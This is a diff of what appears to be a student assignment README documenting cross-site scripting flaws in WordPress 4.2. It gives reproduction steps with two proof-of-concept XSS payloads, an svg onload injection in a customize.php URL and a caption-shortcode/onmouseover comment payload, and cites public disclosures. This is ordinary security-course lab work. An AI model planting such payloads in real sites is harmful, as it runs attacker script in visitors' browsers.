@@ -11,21 +11,26 @@ Time spent: **5** hours spent in total
     - Vulnerability types: XSS
     - Tested in version: 4.2
     - Fixed in version: 4.2.6
-  - [ ] GIF Walkthrough: ![](XSS1.gif)
+  - [ ] GIF Walkthrough: (XSS1.gif)
   - [ ] Steps to recreate: Make a post and then enter the following in the reply:
+    
     http://www.test.com/wp-admin/customize.php?theme=<svg onload=alert(1)>
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
-1. (Required) Vulnerability Name or ID
+2. (Required) Vulnerability Name or ID
   - [ ] Summary: 
-    - Vulnerability types:
-    - Tested in version:
-    - Fixed in version: 
+    - Vulnerability types:Cross-Site Scripting (XSS)
+    - Tested in version:4.2
+    - Fixed in version: 4.2.3
   - [ ] GIF Walkthrough: 
-  - [ ] Steps to recreate: 
+  - [ ] Steps to recreate: Make a post and in the body of the post enter the following:
+  
+  <a href="[caption code=">]</a><a title=" onmouseover=alert('Exploit2!') ">here</a>
   - [ ] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
-1. (Required) Vulnerability Name or ID
+   - [WPScan Vulnerability Database Vulnerability #7945](https://wpvulndb.com/vulnerabilities/7945)
+   - [Letter by Jouko Pynnönen Regarding the Discovery of the Vulnerability](https://packetstormsecurity.com/files/131644/)
+
+3. (Required) Vulnerability Name or ID
   - [ ] Summary: 
     - Vulnerability types:
     - Tested in version:
